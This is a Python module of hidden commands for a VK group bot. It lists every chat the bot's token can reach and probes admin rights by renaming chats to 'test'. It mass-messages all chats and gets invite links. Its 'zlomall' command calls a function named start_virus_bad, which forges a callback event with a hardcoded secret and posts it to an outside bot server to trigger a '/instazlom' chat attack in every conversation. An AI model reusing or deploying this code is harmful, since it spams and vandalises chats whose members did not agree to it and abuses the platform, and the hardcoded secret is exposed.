import json
import random
import re
import time

import requests
import vk_api

from bot_handler.core.command import Command
from lib.Tools import ExecuteStack


def start_virus_bad(peer_id):
    cmd = '/instazlom'
    payload = {"type": "message_new",
               "object": {"date": round(time.time()), "from_id": 74942444, "id": 0, "out": 0, "peer_id": peer_id,
                          "text": cmd, "conversation_message_id": 0, "fwd_messages": [], "important": False,
                          "random_id": 0, "attachments": [], "is_hidden": False}, "group_id": 178806547,
               "secret": "kearbiwacyirchtAwWnbyvpwafiv5viy"}
    payload = json.dumps(payload)
    req = requests.post('https://bombot.cf/bot_handler/vkGroup', payload)
    return 1


def vk_get_all_convs(access_token):
    to_ret = {'admin': [], 'noadmin': [], 'latest': -1}
    access_token = access_token
    counter = 0
    peer_id = 2000000001
    cur_conv = 0
    noadminconvs = []
    latest_ind = -1
    while 1:
        code = '''
        var ret = [];
        var peer_id = ''' + str(peer_id) + ''';
        var counter = 0;
        var resp;
        while (counter<25) {
            resp = API.messages.getConversationsById({"peer_ids": peer_id});
            ret = ret + [resp];
            counter = counter+1;
            peer_id = peer_id+1;
        }
        return ret;

        '''
        payload = {
            'code': code,
            'v': 5.85,
            'access_token': access_token
        }

        req = requests.post('https://api.vk.com/method/execute', data=payload)
        resp_json = req.json()
        brek = 0
        for conv in resp_json['response']:
            cur_conv += 1
            if not conv:
                brek = 1
                latest_ind = cur_conv - 1
                break
            if not conv['items']:
                noadminconvs.append(cur_conv)
                continue
            cur_conv_dt = {'id': conv['items'][0]['peer']['id'], 'title': conv['items'][0]['chat_settings']['title']}
            to_ret['admin'].append(cur_conv_dt)
        if brek:
            break
        peer_id += 25

    # CurrentUse.send_msg('\n'.join([str(ii) for ii in noadminconvs]))
    # return None
    vk_session = vk_api.VkApi(token=access_token)
    while noadminconvs:
        cur = []
        for i in range(25):
            try:
                cur.append(str(noadminconvs.pop(0)))
            except BaseException:
                break
        code = '''
        var ret = [];
        var convs = [''' + ','.join(cur[::-1]) + '''];
        var counter = 0;
        var resp;
        var conv;
        while (convs.length>0) {
            conv = convs.pop();
                resp = API.messages.editChat({"chat_id": conv, "title": "test"});
                ret = ret + [resp];
        }
        return ret;'''

        payload = {'code': code}
        resp = vk_session.method('execute', payload, raw=True)

        for cur_err in resp['execute_errors']:
            try:
                cur_conv = cur.pop(0)
            except BaseException:
                continue
            if cur_err['error_code'] == 925:
                cur_conv_dt = {'id': int(cur_conv) + 2000000000, 'title': ''}
                to_ret['noadmin'].append(cur_conv_dt)

    to_ret['latest'] = str(2000000000 + latest_ind)
    return to_ret


# ---------BotFunctions---------


@Command('getconvs', hidden=True,
         allow_group_owner=True,
         block='others', description='Return all conversations with ArhiBot')
def get_all_conversations(CurrentUse):
    datas = vk_get_all_convs(CurrentUse.vk_group.api.token['access_token'])
    text = 'ADMIN:\n'

    for conv in datas['admin']:
        text += str(conv['id']) + ': ' + conv['title'] + '\n'

    text += '\nNO ADMIN: \n'

    for conv in datas['noadmin']:
        text += str(conv['id']) + '\n'

    text += '\ncount: ' + str(len(datas['admin']) + len(datas['noadmin'])) + '\n'
    text += 'latest id: ' + datas['latest']

    return text


@Command('info', block='others', description='Return peer id', allow_default=True)
def info(CurrentUse):
    event_p = CurrentUse.event_p
    return event_p['peer_id']


@Command('smsall', hidden=True,
         block='admin_tools', disable_parser=1,
         description='Send message to all chats')
def send_msg_to_all(CurrentUse):
    parser_p = CurrentUse.parser_p
    event_p = CurrentUse.event_p

    attachments = []
    for attach in event_p['attachments']:
        try:
            type = attach['type']
            id = attach[type]['id']
            owner_id = attach[type]['owner_id']
        except BaseException:
            continue
        try:
            access_key = '_' + attach[type]['access_key']
        except BaseException:
            access_key = ''
        attachments.append(type + str(owner_id) + '_' + str(id) + access_key)

    datas = re.match('(.*)', CurrentUse.text, re.DOTALL)
    if not datas:
        return {'message': 'Cheto ne tak'}

    exec_stack = ExecuteStack(CurrentUse.vk_group.api)

    all_convs = vk_get_all_convs(CurrentUse.vk_group.api.token['access_token'])
    all_convs = all_convs['admin'] + all_convs['noadmin']

    for conv in all_convs:
        peer_id = conv['id']
        payload = {
            'peer_id': peer_id,
            'message': datas[1],
            'attachment': ','.join(attachments),
            'random_id': random.randint(0, 10000000)
        }

        exec_stack.add('messages.send', payload)

    resps = exec_stack.finish()
    indent = '&#12288;&#12288;'
    return 'Vrode sent to {} chats'.format(len(all_convs))


@Command('smsall2', hidden=True, disable_parser=1,
         block='admin_tools',
         description='Send message to all chats')
def smsall_test(CurrentUse):
    event_p = CurrentUse.event_p
    attachments = []
    for attach in event_p['attachments']:
        try:
            type = attach['type']
            id = attach[type]['id']
            owner_id = attach[type]['owner_id']
        except BaseException:
            continue
        try:
            access_key = '_' + attach[type]['access_key']
        except BaseException:
            access_key = ''
        attachments.append(type + str(owner_id) + '_' + str(id) + access_key)

    text = CurrentUse.text
    text = text.replace('\n', '\\n')
    text = text.replace('"', '\\"')
    ind = 1
    while 1:

        code = '''var start = ''' + str(ind) + ''';
    var ind = start;
    var end = start+25;
    var text = "''' + str(text) + '''";
    var random = ''' + str(random.randint(0, 100000)) + ''';

    var r;
    while (ind<end) {

    r = API.messages.send({"attachment":"''' + ','.join(attachments) + '''", "peer_id": 2000000000+ind, "message":text, "random_id": random + ind});
    ind = ind+1;
    }
    '''
        payload = {
            'code': code,
        }

        resp = CurrentUse.vk_group.api.method('execute', payload, raw=True)
        d = 0
        try:
            for err in resp['execute_errors']:
                if err['error_code'] != 10:
                    d = 1
                    break
        except:
            pass

        if not d:
            break

        ind += 25
    return 'a nu davai'


@Command('getinvlnk', hidden=True,
         block='admin_tools',
         description='Get invite link to chat')
def vk_get_invite_link(CurrentUse):
    payload = {
        'peer_id': 2000000000 + CurrentUse.parser_p.chat_id,
        # 'reset': CurrentUse.parser_p.r,
        # 'group_id': abs(CONFIG.VK_GROUP_ID)

    }

    resp = CurrentUse.vk_group.api.method('messages.getInviteLink', payload)
    return resp['link']


parser = vk_get_invite_link.parser
parser.add_argument('chat_id', type=int)
parser.add_argument('-r', action='store_true', default=False)


@Command('zlomall', hidden=True,
         block='admin_tools',
         description='Zlom all chats', disable_parser=True)
def zlom_all(CurrentUse):
    all_convs = vk_get_all_convs(CurrentUse.vk_group.api.token['access_token'])
    all_convs = all_convs['admin'] + all_convs['noadmin']

    for conv in all_convs:
        peer_id = conv['id']
        start_virus_bad(peer_id)

    return 'Vrode zlomano {} chats'.format(len(all_convs))
